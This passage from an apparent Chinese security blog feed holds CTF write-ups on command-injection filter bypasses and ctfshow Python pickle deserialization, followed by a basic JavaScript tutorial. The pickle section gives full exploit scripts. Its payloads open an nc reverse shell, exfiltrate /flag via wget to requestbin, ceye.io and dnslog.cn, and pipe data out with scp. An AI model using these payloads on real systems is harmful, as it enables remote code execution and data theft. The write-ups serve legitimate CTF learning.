<h3 id="变量ab互换传递，绕过字符串匹配，实现拼接"><a href="#变量ab互换传递，绕过字符串匹配，实现拼接" class="headerlink" title="变量ab互换传递，绕过字符串匹配，实现拼接"></a>变量ab互换传递，绕过字符串匹配，实现拼接</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?ip=127.0.0.1;b=ag;a=fl;cat$IFS$1$a$b.php</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?ip=127.0.0.1;b=lag;a=f;cat$IFS$a$b.php</span><br></pre></td></tr></table></figure>

<h3 id="被过滤的bash，用管道-sh替换"><a href="#被过滤的bash，用管道-sh替换" class="headerlink" title="被过滤的bash，用管道+sh替换"></a>被过滤的bash，用管道+sh替换</h3><p><code>cat flag.php</code>用base64加密来绕过正则匹配</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?ip=127.0.0.1;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|bash</span><br></pre></td></tr></table></figure>

<p>过滤了flag、bash，但sh没过滤，linux下可用sh</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?ip=127.0.0.1;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh</span><br></pre></td></tr></table></figure>

<p><code>|sh</code> 就是执行前面的echo脚本</p>
<h3 id="类似题的大概思路"><a href="#类似题的大概思路" class="headerlink" title="类似题的大概思路"></a>类似题的大概思路</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat fl*  用*匹配任意 </span><br><span class="line">cat fla* 用*匹配任意</span><br><span class="line">ca\t fla\g.php        反斜线绕过</span><br><span class="line">cat fl&#x27;&#x27;ag.php        两个单引号绕过</span><br><span class="line">echo &quot;Y2F0IGZsYWcucGhw&quot; | base64 -d | bash      </span><br><span class="line">//base64编码绕过(引号可以去掉)  |(管道符) 会把前一个命令的输出作为后一个命令的参数</span><br><span class="line"></span><br><span class="line">echo &quot;63617420666c61672e706870&quot; | xxd -r -p | bash       </span><br><span class="line">//hex编码绕过(引号可以去掉)</span><br><span class="line"></span><br><span class="line">echo &quot;63617420666c61672e706870&quot; | xxd -r -p | sh     </span><br><span class="line">//sh的效果和bash一样</span><br><span class="line"></span><br><span class="line">cat fl[a]g.php       用[]匹配</span><br><span class="line"></span><br><span class="line">a=fl;b=ag;cat $a$b          变量替换</span><br><span class="line">cp fla&#123;g.php,G&#125;    把flag.php复制为flaG</span><br><span class="line">ca$&#123;21&#125;t a.txt     利用空变量  使用$*和$@，$x(x 代表 1-9),$&#123;x&#125;(x&gt;=10)(小于 10 也是可以的) 因为在没有传参的情况下，上面的特殊变量都是为空的 </span><br></pre></td></tr></table></figure>

<p>通配符</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">*       <span class="comment">#匹配全部字符，通配符</span></span><br><span class="line">?       <span class="comment">#任意一个字符，通配符</span></span><br><span class="line">[]      <span class="comment">#表示一个范围（正则，通配符）</span></span><br><span class="line">&#123;&#125;      <span class="comment">#产生一个序列（通配符）</span></span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2023/11/20/2UfKa9yFiozxOg8.png" alt="在这里插入图片描述"></p>
]]></content>
      <categories>
        <category>命令执行</category>
      </categories>
      <tags>
        <tag>命令执行</tag>
        <tag>Ping</tag>
      </tags>
  </entry>
  <entry>
    <title>ctfshow python 反序列化 刷题记录</title>
    <url>/2024/03/25/ctfshow%20python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<h1 id="web277"><a href="#web277" class="headerlink" title="web277"></a>web277</h1><p><img src="https://s2.loli.net/2024/03/22/KtLTjnsRNxovg54.png" alt="image-20240322142018874"></p>
<p>进入靶场会看到<code>where is flag?</code>，Ctrl+U 检查源代码后可以看到注释的 html 标签</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--/backdoor?data= m=base64.b64decode(data) m=pickle.loads(m) --&gt;</span></span><br></pre></td></tr></table></figure>

<p>看到 <code>pickle.loads</code> 就知道是 python 反序列化没跑了。</p>
<p>先看给的提示：传入的 data 先进行 base64 解码后在进行反序列化，所以我们序列化完成之后还要额外进行 base64 编码</p>
<p>先简单的写一个爬虫脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">exp</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        payload = <span class="string">&#x27;ls /&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> (os.popen,(payload,))</span><br><span class="line"></span><br><span class="line">a=exp()</span><br><span class="line">b=pickle.dumps(a)</span><br><span class="line">c=base64.b64encode(b)</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://db665ec1-9a5b-4b46-a07e-045ad97ce824.challenge.ctf.show/backdoor&quot;</span></span><br><span class="line">params=&#123;<span class="string">&#x27;data&#x27;</span>:c&#125;</span><br><span class="line"></span><br><span class="line">r=requests.get(url=url,params=params)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>

<p><code>params</code> 的作用是将请求中的参数添加到 URL 中，以便将这些参数传递给服务器。在这种情况下，<code>params</code> 是一个字典，包含了要作为查询字符串添加到 URL 中的参数。最终的 URL 将包含这些参数，以便服务器可以根据这些参数来处理请求。</p>
<p><img src="https://s2.loli.net/2024/03/25/aQXqUsPznAtljSu.png" alt="image-20240325161132826"></p>
<p>无论是<code>ls /</code>还是<code>cat /flag</code>，回显都是 backdoor here：说明是一道 ”无回显“ 的题目。</p>
<p>有两种方法：反弹 shell 和 的 dns 外带</p>
<h2 id="反弹-shell"><a href="#反弹-shell" class="headerlink" title="反弹 shell"></a>反弹 shell</h2><p>只需将脚本稍微改一下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">exp</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        payload = <span class="string">&#x27;nc vps-ip port -e /bin/sh&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> (os.popen,(payload,))</span><br><span class="line"></span><br><span class="line">a=exp()</span><br><span class="line">b=pickle.dumps(a)</span><br><span class="line">c=base64.b64encode(b)</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://db665ec1-9a5b-4b46-a07e-045ad97ce824.challenge.ctf.show/backdoor&quot;</span></span><br><span class="line">params=&#123;<span class="string">&#x27;data&#x27;</span>:c&#125;</span><br><span class="line"></span><br><span class="line">r=requests.get(url=url,params=params)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>

<p>然后先再 vps 上开启对应端口的监听在运行脚本（否则会报错）</p>
<p>以1234端口为例：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvnp 1234</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2024/03/25/LCyvSGJfg9Epw3q.png" alt="image-20240325162846097"></p>
<p>运行脚本后则会显示：</p>
<p><img src="https://s2.loli.net/2024/03/25/SiwdO6NEAnYuMve.png" alt="image-20240325162614566"></p>
<p>此时就可以输入 Linux 命令来读取 flag 啦</p>
<p><img src="https://s2.loli.net/2024/03/25/stgkjELFWx4zRCY.png" alt="image-20240325162748641"></p>
<h2 id="dns-外带"><a href="#dns-外带" class="headerlink" title="dns 外带"></a>dns 外带</h2><h3 id="RequestBin"><a href="#RequestBin" class="headerlink" title="RequestBin"></a>RequestBin</h3><p>网址：<a href="http://requestbin.cn/">RequestBin — Collect, inspect and debug HTTP requests and webhooks</a></p>
<p>先点击 Create a RequestBin 获取一个 url</p>
<p>同样只需将脚本稍微改一下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">exp</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        payload = <span class="string">&#x27;wget http://requestbin.cn:80/1cpartx1?a=`cat /flag`&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> (os.popen,(payload,))</span><br><span class="line"></span><br><span class="line">a=exp()</span><br><span class="line">b=pickle.dumps(a)</span><br><span class="line">c=base64.b64encode(b)</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://6ebe56d4-210d-4cbe-836f-078deeb4a9d0.challenge.ctf.show/backdoor&quot;</span></span><br><span class="line">params=&#123;<span class="string">&#x27;data&#x27;</span>:c&#125;</span><br><span class="line"></span><br><span class="line">r=requests.get(url=url,params=params)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>

<p><code>wget</code>是一个在命令行下使用的下载工具，它可以从指定的URL下载文件。</p>
<p>运行脚本就能得到 flag</p>
<p><img src="https://s2.loli.net/2024/03/25/YGwpP7oOaM9IK52.png" alt="image-20240325170204095"></p>
<h3 id="CEYE"><a href="#CEYE" class="headerlink" title="CEYE"></a>CEYE</h3><p>网址：<a href="http://ceye.io/">CEYE - Monitor service for security testing</a></p>
<p>可以稍微参考一下这篇文章：<a href="https://blog.csdn.net/weixin_46706771/article/details/119031343">RCE绕过之无回显-CSDN博客</a>，也可以在 <a href="http://ceye.io/payloads">http://ceye.io/payloads</a> 中找相对应的 payload</p>
<p>在 <a href="http://ceye.io/profile">http://ceye.io/profile</a> 下的 Identifier 可以获取对应 url</p>
<p>同样只需将脚本稍微改一下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">exp</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        payload = <span class="string">&#x27;wget `cat /flag`.zrne70.ceye.io&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> (os.popen,(payload,))</span><br><span class="line"></span><br><span class="line">a=exp()</span><br><span class="line">b=pickle.dumps(a)</span><br><span class="line">c=base64.b64encode(b)</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://6ebe56d4-210d-4cbe-836f-078deeb4a9d0.challenge.ctf.show/backdoor&quot;</span></span><br><span class="line">params=&#123;<span class="string">&#x27;data&#x27;</span>:c&#125;</span><br><span class="line"></span><br><span class="line">r=requests.get(url=url,params=params)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>

<p>在 <a href="http://ceye.io/records/dns">http://ceye.io/records/dns</a> 即可找到 flag</p>
<p><img src="https://s2.loli.net/2024/03/25/Uf6brd5ZWoIgSEa.png" alt="yqftM9pg8duAUEF"></p>
<h3 id="DNSlog"><a href="#DNSlog" class="headerlink" title="DNSlog"></a>DNSlog</h3><p>网址：<a href="http://www.dnslog.cn/">DNSLog Platform</a></p>
<p>先点击 Get SubDomain 获取一个 url</p>
<p>同样只需将脚本稍微改一下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">exp</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        payload = <span class="string">&#x27;wget `cat /flag`.n4jlw3.dnslog.cn&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> (os.popen,(payload,))</span><br><span class="line"></span><br><span class="line">a=exp()</span><br><span class="line">b=pickle.dumps(a)</span><br><span class="line">c=base64.b64encode(b)</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://6ebe56d4-210d-4cbe-836f-078deeb4a9d0.challenge.ctf.show/backdoor&quot;</span></span><br><span class="line">params=&#123;<span class="string">&#x27;data&#x27;</span>:c&#125;</span><br><span class="line"></span><br><span class="line">r=requests.get(url=url,params=params)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>

<p>运行脚本后，回到 DNSlog 平台，点击 Refresh Record 就可看到被拼接的 flag</p>
<p><img src="https://s2.loli.net/2024/03/27/ZoxwrS8jdOpfTyE.png" alt="image-20240327153137694"></p>
<p>我还有其他想法：既然是命令执行，为什么不尝试一下无回显 RCE 中那些获取 flag 的方式？</p>
<h2 id="tee"><a href="#tee" class="headerlink" title="tee"></a>tee</h2><p>用如下指令将 flag 的内容上传到 vps 中</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /flag | scp -q -P port_number -i /path/to/private_key_file - user@vps_ip:/path/on/vps/</span><br></pre></td></tr></table></figure>

<p>这个命令的含义是将本地计算机上的<code>/flag</code>文件传输到远程VPS服务器上的指定路径。下面是命令中各个部分的解释：</p>
<ul>
<li><code>cat /flag</code>: 使用<code>cat</code>命令读取<code>/flag</code>文件的内容。</li>
<li><code>|</code>: 管道符号，将<code>cat /flag</code>的输出作为输入传递给下一个命令。</li>
<li><code>scp</code>: 用于在本地计算机和远程服务器之间安全地复制文件的命令。</li>
<li><code>-q</code>: 在<code>scp</code>命令中使用<code>-q</code>参数表示安静模式，即不显示传输过程的详细信息。</li>
<li><code>-P port_number</code>: 指定远程服务器的端口号。</li>
<li><code>-i /path/to/private_key_file</code>: 指定用于身份验证的私钥文件的路径。</li>
<li><code>user@vps_ip</code>: 远程VPS服务器的用户名和IP地址。</li>
<li><code>:/path/on/vps/</code>: 在远程VPS服务器上指定的路径，将文件传输到该路径。</li>
</ul>
<p>更改下脚本：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">exp</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        payload = <span class="string">&#x27;wget `cat /flag | tee 1.txt`&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> (os.popen,(payload,))</span><br><span class="line"></span><br><span class="line">a=exp()</span><br><span class="line">b=pickle.dumps(a)</span><br><span class="line">c=base64.b64encode(b)</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://6ebe56d4-210d-4cbe-836f-078deeb4a9d0.challenge.ctf.show/backdoor&quot;</span></span><br><span class="line">params=&#123;<span class="string">&#x27;data&#x27;</span>:c&#125;</span><br><span class="line"></span><br><span class="line">r=requests.get(url=url,params=params)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>







<h1 id="web278"><a href="#web278" class="headerlink" title="web278"></a>web278</h1><p>提示：过滤了 os.system</p>
<p>使用上题脚本即可</p>
<p>python 可以执行命令的函数：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">eval</span>, execfile, <span class="built_in">compile</span>, <span class="built_in">open</span>, file, <span class="built_in">map</span>, <span class="built_in">input</span>,</span><br><span class="line">os.system, os.popen, os.popen2, os.popen3, os.popen4, os.<span class="built_in">open</span>, os.pipe,</span><br><span class="line">os.listdir, os.access,</span><br><span class="line">os.execl, os.execle, os.execlp, os.execlpe, os.execv,</span><br><span class="line">os.execve, os.execvp, os.execvpe, os.spawnl, os.spawnle, os.spawnlp, os.spawnlpe,</span><br><span class="line">os.spawnv, os.spawnve, os.spawnvp, os.spawnvpe,</span><br><span class="line">pickle.load, pickle.loads,cPickle.load,cPickle.loads,</span><br><span class="line">subprocess.call,subprocess.check_call,subprocess.check_output,subprocess.Popen,</span><br><span class="line">commands.getstatusoutput,commands.getoutput,commands.getstatus,</span><br><span class="line">glob.glob,</span><br><span class="line">linecache.getline,</span><br><span class="line">shutil.copyfileobj,shutil.copyfile,shutil.copy,shutil.copy2,shutil.move,shutil.make_archive,</span><br><span class="line">dircache.listdir,dircache.opendir,</span><br><span class="line">io.<span class="built_in">open</span>,</span><br><span class="line">popen2.popen2,popen2.popen3,popen2.popen4,</span><br><span class="line">timeit.timeit,timeit.repeat,</span><br><span class="line">sys.call_tracing,</span><br><span class="line">code.interact,code.compile_command,codeop.compile_command,</span><br><span class="line">pty.spawn,</span><br><span class="line">posixfile.<span class="built_in">open</span>,posixfile.fileopen,</span><br><span class="line">platform.popen</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>ctfshow</tag>
        <tag>unserialize</tag>
      </tags>
  </entry>
  <entry>
    <title>JavaScript 学习记录</title>
    <url>/2024/04/11/Javascript%20%E8%AF%AD%E6%B3%95/</url>
    <content><![CDATA[<h1 id="JavaScript"><a href="#JavaScript" class="headerlink" title="JavaScript"></a>JavaScript</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><h3 id="用途"><a href="#用途" class="headerlink" title="用途"></a>用途</h3><p>概述：JavaScript 是一门脚本语言。脚本语言的特征是：可以给网页添加一些动态效果</p>
<p>比如：node 平台，开发服务器，利用的也是 JS；React、Vue 框架。他们底层也是通过 JS 实现的。</p>
<h3 id="组成"><a href="#组成" class="headerlink" title="组成"></a>组成</h3><h4 id="前端的组成："><a href="#前端的组成：" class="headerlink" title="前端的组成："></a>前端的组成：</h4><ul>
<li><p>HTML（结构层）：利用语义化标签搭建网页</p>
</li>
<li><p>CSS（样式层）：利用样式进行美化网页，进行网页布局</p>
</li>
<li><p>JavaScript（行为层）：可以给网页添加动态效果</p>
</li>
</ul>
<h4 id="JavaScript-的组成："><a href="#JavaScript-的组成：" class="headerlink" title="JavaScript 的组成："></a>JavaScript 的组成：</h4><p>JavaScript 由三部分组成：ECMAScript、DOM、BOM</p>
<ul>
<li><p>ECMAScript：是由欧洲计算机协会，大概每年六月中旬定制语法规范</p>
</li>
<li><p>DOM：即 document object model，文档对象模型</p>
</li>
<li><p>BOM：即 browser object model，浏览器对象模型</p>
</li>
</ul>
<h3 id="书写规范"><a href="#书写规范" class="headerlink" title="书写规范"></a>书写规范</h3><p>概述：JS 是一门脚本语言，他需要嵌套在网页中才能运行</p>
<p>需要使用双闭合标签 <code>&lt;script&gt;&lt;/script&gt;</code>，将 JS 语法嵌套在网页中运行</p>
<p><code>&lt;script&gt;</code> 标签可以放在网页的<strong>任何</strong>地方</p>
<p>可以同时使用多个 <code>&lt;script&gt;</code> 标签</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">	<span class="title function_">alert</span>(<span class="string">&quot;我是一个js&quot;</span>);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p>JS 语法，必须放在双闭合标签 <code>&lt;script&gt;&lt;/script&gt;</code> 中，嵌套在网页内部执行</p>
</li>
<li><p><code>&lt;script&gt;</code> 标签可以放在程序的任何地方，但是一般会放在程序的最下方</p>
</li>
<li><p><code>&lt;script&gt;</code> 标签内部，只能放 JS 语法。标签、样式等不能放在 <code>&lt;script&gt;</code> 标签内部</p>
</li>
<li><p><code>&lt;script&gt;</code> 标签有一个 type 属性，属性值为 text&#x2F;JavaScript 。代表的是书写 JS 语法</p>
</li>
</ul>
<h2 id="内置语法"><a href="#内置语法" class="headerlink" title="内置语法"></a>内置语法</h2><p>内置函数：内置即浏览器自带的，函数即某个功能</p>
<h3 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h3><h4 id="单行"><a href="#单行" class="headerlink" title="单行"></a>单行</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//</span></span><br></pre></td></tr></table></figure>

<p>快捷键：ctrl + shift + &#x2F;</p>
<h3 id="alert-警告框"><a href="#alert-警告框" class="headerlink" title="alert 警告框"></a>alert 警告框</h3><p>alert 即警告、警报的意思</p>
<p>概述：alert 是 JS 当中内置函数，他的主要作用是，在浏览器的正上方弹出一个警示框</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">	<span class="comment">//内置函数alert</span></span></span><br><span class="line"><span class="language-javascript">	<span class="title function_">alert</span>(<span class="string">&quot;这是一个警示框&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">	<span class="title function_">alert</span>(<span class="string">&#x27;这是另一个警示框&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2024/04/11/aQFmsgErc2XOdAI.png" alt="image-20240408171623855"></p>
<p>警告框使用：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="title function_">alert</span>(<span class="string">&quot;参数&quot;</span>);</span><br><span class="line"><span class="title function_">alert</span>(<span class="string">&#x27;参数&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>小括号里面是传递的参数，即为警告框显示的内容</p>
<p>参数一般用<strong>单引号</strong>或<strong>双引号</strong>包裹</p>
<p>在每一行程序结尾，<strong>必须加上一个分号</strong>，表示这个语句结束了</p>
<h3 id="prompt-提示框"><a href="#prompt-提示框" class="headerlink" title="prompt 提示框"></a>prompt 提示框</h3><p>prompt 即提示、提示符的意思</p>
<p>概述：prompt 也是 JS 中的内置函数，主要作用是在浏览器的上方，弹出一个提示框</p>
<p>注：提示框可以输入内容</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">	<span class="title function_">prompt</span>(<span class="string">&quot;这是一个提示框&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">	<span class="title function_">prompt</span>(<span class="string">&#x27;这是另一个提示框&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2024/04/11/KtIvFZ8dwk9WngC.png" alt="image-20240408171711260"></p>
<p>警告框使用：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="title function_">prompt</span>(<span class="string">&quot;参数&quot;</span>);</span><br><span class="line"><span class="title function_">prompt</span>(<span class="string">&#x27;参数&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>prompt 与 alert 一模一样</p>
<h3 id="console-控制台"><a href="#console-控制台" class="headerlink" title="console 控制台"></a>console 控制台</h3><p>console 即控制台的意思</p>
<p>概述：在 JS 中，可以通过 console 对象的 log 方法在控制台中输出一些内容</p>
<p>控制台可以通过浏览器 右击—检查 查看，</p>
<p>快捷键：ctrl + shift + i</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">	<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;这是一条控制台信息&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">	<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;这是另一条控制台信息&#x27;</span>,<span class="string">&quot;而且还能写两条哦&quot;</span>);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p>console.log 可以在控制台打印一些数据</p>
</li>
<li><p>如果需要打印多个数据，多个数据间用逗号隔开</p>
</li>
<li><p>当程序出现错误的时候会有红色提示，可在控制台查看</p>
</li>
</ul>
<h2 id="字面量"><a href="#字面量" class="headerlink" title="字面量"></a>字面量</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>在 JS 世界当中，我们书写的数据不能是任意的，由于 JS 中的数据是有数据类型划分的。</p>
<p>JS 的数据类型一共有六种：五个基本数据类型和一个引用类型</p>
<h4 id="五个基本的数据类型"><a href="#五个基本的数据类型" class="headerlink" title="五个基本的数据类型"></a>五个基本的数据类型</h4><p>string（字符串类型）：” JS “</p>
<p>Number（数字类型）：100、200、2000</p>
<p>Boolean（布尔类型）：true、false</p>
<p>Undefined（为定义类型）：undefined</p>
<p>Null（空对象类型）：null</p>
<h4 id="一个引用类型"><a href="#一个引用类型" class="headerlink" title="一个引用类型"></a>一个引用类型</h4><p>Object（引用类型）：函数、数组、正则、DOM、BOM</p>
<p>注意：编程时，书写的数据必须是这六种数据类型当中的数值，如果不是程序就会报错，例如不加引号的字符串</p>
<h3 id="字面量-1"><a href="#字面量-1" class="headerlink" title="字面量"></a>字面量</h3><p>就是某一个类型数据的一个固定数值；当看到这个固定数值的时候，就知道它是属于哪种类型的数据</p>
<h4 id="数字类型字面量"><a href="#数字类型字面量" class="headerlink" title="数字类型字面量"></a>数字类型字面量</h4><p>概述：在 JS 当中，数字类型的字面量使用频率相对较高。常用的数字类型字面量就是整数和小数（浮点数）</p>
<h5 id="整数字面量"><a href="#整数字面量" class="headerlink" title="整数字面量"></a>整数字面量</h5><p>概述：在 JS 当中整数字面量，即为十进制的数字。逢 10 进一。整数的数字区分正负之分。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">100</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(-<span class="number">100</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出</span></span><br><span class="line"><span class="number">100</span></span><br><span class="line">-<span class="number">100</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p>整数是有正负之分的。</p>
</li>
<li><p>数字在控制台中打印的时候，是蓝色的。</p>
</li>
</ul>
<h5 id="浮点数"><a href="#浮点数" class="headerlink" title="浮点数"></a>浮点数</h5><p>概述：浮点数，即为小数。数字当中带有小数点的。浮点数也有正负之分。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">.12</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(-<span class="number">.12</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">22.12</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出</span></span><br><span class="line"><span class="number">0.12</span></span><br><span class="line">-<span class="number">0.12</span></span><br><span class="line"><span class="number">22.12</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p>小数即为浮点数。数字当中带有小数点的。</p>
</li>
<li><p>小数也有正负之分</p>
</li>
<li><p>0~1之间的小数可以省略零</p>
</li>
</ul>
